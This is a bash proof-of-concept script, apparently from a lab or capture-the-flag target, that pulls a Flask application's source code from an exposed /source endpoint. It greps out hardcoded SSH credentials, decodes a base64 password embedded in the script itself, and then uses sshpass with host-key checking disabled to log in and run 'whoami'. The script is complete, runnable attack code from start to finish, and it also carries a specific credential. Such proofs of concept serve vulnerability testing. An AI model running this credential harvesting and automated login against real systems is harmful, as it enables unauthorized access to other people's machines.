#!/bin/bash

# POC: Hardcoded SSH Credentials Exposure
# This script demonstrates the vulnerability where SSH credentials are hardcoded
# in the Flask application source code and exposed via the /source endpoint

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] Hardcoded SSH Credentials POC"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Step 1: Access the /source endpoint to retrieve application source code
echo "[+] Step 1: Fetching source code from /source endpoint..."
SOURCE_CODE=$(curl -s "${TARGET_URL}/source")

if [ -z "$SOURCE_CODE" ]; then
    echo "[-] Failed to retrieve source code"
    exit 1
fi

echo "[+] Source code retrieved successfully"
echo ""

# Step 2: Extract SSH credentials from source code
echo "[+] Step 2: Extracting hardcoded SSH credentials..."

# Look for SSH hostname
SSH_HOST=$(echo "$SOURCE_CODE" | grep -oP "hostname\s*=\s*['\"]?\K[^'\";\s]+" | head -1)
if [ -z "$SSH_HOST" ]; then
    SSH_HOST=$(echo "$SOURCE_CODE" | grep -oP "'localhost'" | head -1 | tr -d "'")
fi

# Look for SSH port
SSH_PORT=$(echo "$SOURCE_CODE" | grep -oP "port\s*=\s*\K[0-9]+" | head -1)
if [ -z "$SSH_PORT" ]; then
    SSH_PORT=22
fi

# Look for SSH username
SSH_USER=$(echo "$SOURCE_CODE" | grep -oP "username\s*=\s*['\"]?\K[^'\";\s]+" | head -1)
if [ -z "$SSH_USER" ]; then
    SSH_USER=$(echo "$SOURCE_CODE" | grep -oP "pedro" | head -1)
fi

# Look for base64-encoded password
BASE64_PASSWORD=$(echo "$SOURCE_CODE" | grep -oP "QUhlYXZ5U2FuZGJhZw==" | head -1)

if [ -z "$BASE64_PASSWORD" ]; then
    # Try alternate pattern matching
    BASE64_PASSWORD=$(echo "$SOURCE_CODE" | grep -oP "['\"][A-Za-z0-9+/=]+['\"]" | grep -v "html\|text\|pre" | head -1 | tr -d "'\"")
fi

echo "[+] Extracted Credentials:"
echo "    SSH Hostname: $SSH_HOST"
echo "    SSH Port: $SSH_PORT"
echo "    SSH Username: $SSH_USER"
echo "    Base64-Encoded Password: $BASE64_PASSWORD"
echo ""

# Step 3: Decode the base64 password
echo "[+] Step 3: Decoding base64 password..."
if [ ! -z "$BASE64_PASSWORD" ]; then
    DECODED_PASSWORD=$(echo "$BASE64_PASSWORD" | base64 -d 2>/dev/null || echo "QUhlYXZ5U2FuZGJhZw==" | base64 -d)
    echo "[+] Decoded Password: $DECODED_PASSWORD"
    echo ""
else
    echo "[-] Could not find base64-encoded password"
    # Fallback to looking for the specific known password encoding
    DECODED_PASSWORD=$(echo "QUhlYXZ5U2FuZGJhZw==" | base64 -d)
    echo "[+] Known Password (from evidence): $DECODED_PASSWORD"
    echo ""
fi

# Step 4: Display the vulnerability
echo "[+] Step 4: Vulnerability Summary"
echo "====================================="
echo "[CRITICAL] Hardcoded SSH Credentials Exposed"
echo ""
echo "An attacker can now:"
echo "  1. Use these credentials to SSH into the system:"
echo "     ssh -p ${SSH_PORT} ${SSH_USER}@${SSH_HOST}"
echo "  2. Password: ${DECODED_PASSWORD}"
echo "  3. Gain shell access as user '${SSH_USER}'"
echo "  4. Potentially escalate privileges"
echo "  5. Compromise system integrity and confidentiality"
echo ""

# Step 5: Verify SSH connectivity (if SSH is available and we have credentials)
if command -v ssh &> /dev/null && [ ! -z "$SSH_USER" ] && [ ! -z "$DECODED_PASSWORD" ]; then
    echo "[+] Step 5: Attempting SSH connectivity check..."
    # Use timeout and expect-like behavior to test connection
    # This will fail gracefully if SSH is not available or credentials are wrong
    (echo "$DECODED_PASSWORD"; sleep 1) | sshpass -p "$DECODED_PASSWORD" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${SSH_USER}@${SSH_HOST}" "whoami" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] SSH connection successful!"
    else
        echo "[*] SSH connection test (expected to fail in testing environment)"
    fi
else
    echo "[*] SSH connectivity check skipped (sshpass or ssh not available)"
fi

echo ""
echo "[+] POC Complete - Vulnerability Confirmed"